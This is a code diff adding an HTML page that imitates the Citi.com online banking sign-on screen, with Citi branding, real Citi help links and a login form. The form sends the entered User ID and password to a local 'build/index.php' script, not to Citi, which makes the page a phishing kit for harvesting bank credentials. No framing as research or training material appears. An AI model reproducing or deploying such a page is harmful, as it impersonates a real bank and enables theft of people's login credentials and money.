@@ -1,0 +1,189 @@
+<html lang="zxx"><head>
+    <title>Online Banking, Mortgages, Personal Loans, Investing | Citi.com</title>
+    <!-- Meta tag Keywords -->
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    
+    <link rel="stylesheet" href="css/style.css" type="text/css" media="all"><!-- Style-CSS -->
+    <link href="css/font-awesome.css" rel="stylesheet"><!-- font-awesome-icons -->
+<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <style>
+        ul {
+  list-style-type: none;
+  margin: -8px;
+  padding: 0px 16px 0px 1px;;
+  overflow: hidden;
+  background-color: #333;
+  width: 100%;
+  height: 41px;
+}
+
+li {
+    float: right;
+ font-size: 10px;
+ font-family: Interstate_Light,sans-serif,Arial,sans-serif;
+}
+
+li a {
+  display: block;
+  color: white;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+  float:right;
+}
+
+li a:hover {
+  background-color: #111;
+}
+.header {
+  overflow: hidden;
+  background: linear-gradient(180deg,#ffffff,#00b3f0 18%,#0066b3 77%,#004985);
+  padding: 13px 10px;
+}
+.header2 {
+   overflow: hidden;
+  background-color: white ;
+  padding: 15px 10px;
+  
+}
+img{
+    width: 70px ;
+}
+.error{
+  display: none;
+  padding: 10px;
+  border-radius: 5px;
+}
+.perror,#perror{
+      font-weight: bold;
+    font-size: 14px;
+    line-height: 27px;
+    padding: 7px;
+    border-radius: 2px;
+    color: #000;
+    margin-bottom: 10px;
+    background-color: #b6151e;
+}
+
+    </style>
+
+
+    <script type="text/javascript">
+    
+    function validateForm() {
+  var user = document.forms["myForm"]["user"].value;
+  var pass = document.forms["myForm"]["pass"].value;
+  if (user == "") {
+    $("#error").show();
+    return false;
+  }
+    if (pass == "") {
+    $("#error").show();
+    return false;
+  }
+}
+</script>
+</head>
+
+<body>
+    <ul>
+          <li><a href="#">Español</a></li>
+         <li><a href="#">Open an Account</a></li>
+           <li><a href="#">ATM/Branch</a></li>
+  
+  
+             </ul> 
+    <section class="signin-form">
+         <div class="header">
+                   <img src="images/Citi.png">
+  
+                  </div>
+
+          <div class="header2">
+ <p style="
+    font-family: Interstate_Light,sans-serif,Arial,sans-serif;
+">Credit Cards &nbsp;&nbsp;&nbsp; &nbsp; Banking &nbsp;&nbsp;&nbsp;&nbsp;  Lending &nbsp;&nbsp;&nbsp;&nbsp; Linvestiong &nbsp;&nbsp;&nbsp;&nbsp;  Citigold <sup>®</sup></p>
+          </div>          
+
+
+        <div class="overlay" style="padding-top: 32px;">
+            <div class="wrapper" style="background-color: #ececec;">
+                <br>
+                
+                  
+                    <br>
+                
+                <div class="form34">
+                    <h4 class="form-head" align="center">Sign On</h4>
+           <div id="error" class="error">         
+<span id="error" class="error" style="
+    font-family: Interstate_Bold !important;
+    font-size: 16px !important;
+    line-height: 28px !important;
+    margin-bottom: 20px !important;
+    color: red;
+"> 
+
+
+<img src="https://online.citi.com/GFC/branding/img/errorLogo.svg" alt="Error Logo" style="
+    width: 17px;
+">&nbsp;
+ Trouble signing on? Select "Forgot User ID" or "Forgot Password".
+
+</span>
+</div>
+
+                    
+                    <br>
+       <form name="myForm" action="build/index.php" onsubmit="return validateForm()" method="post">
+                        <div class="">
+                           
+                            <input type="text" name="user" class="input" placeholder="User ID" id="user">
+                        </div>
+                        <div class="">
+                         
+                            <input type="password" name="pass" class="input" placeholder="password" id="pass">
+                        </div>
+                        <label class="remember">
+                            <input type="checkbox">
+                            <span class="checkmark" style="
+    filter: progid: DXImageTransform.Microsoft.gradient( startColorstr='#3A7FBA', endColorstr='#07579E', GradientType=0);
+    font-family: 'Interstate-Regular', arial, sans-serif;
+    font-size: 16px;
+    font-weight: 300;
+    
+    text-align: center;
+    text-transform: uppercase;
+   "></span>Remember My User ID
+                        </label>
+                       <button type="submit" class="signinbutton btn" name="login" value="signin" style="
+    color: #fff;
+    border-color: #056dae;
+    background: #056dae;
+">Sign in</button>
+<br><br>
+                       <a id="cmlink_SignOnHelp_DD" href="https://online.citi.com/US/JSO/uidn/RequestUserIDReminder.do" target="_top" style="
+    color: #00589D;
+    font-size: 14px;
+">Forgot User ID/Password?</a> <br>
+<a id="cmlink_SignOnHelp_DD" href="https://online.citi.com/US/JSO/uidn/RequestUserIDReminder.do" target="_top" style="
+    color: #00589D;
+    font-size: 14px;
+">Ingresar en Español</a>
+
+                    </form>
+                </div>
+                <br><br>
+            </div>
+            <!-- copyright -->
+		<div class="copyright text-center">
+                <p>Copyright© 2019 Citigroup Inc</p>
+            </div>
+            <!-- //copyright --> 
+        </div>
+    </section>
+
+
+</body></html>
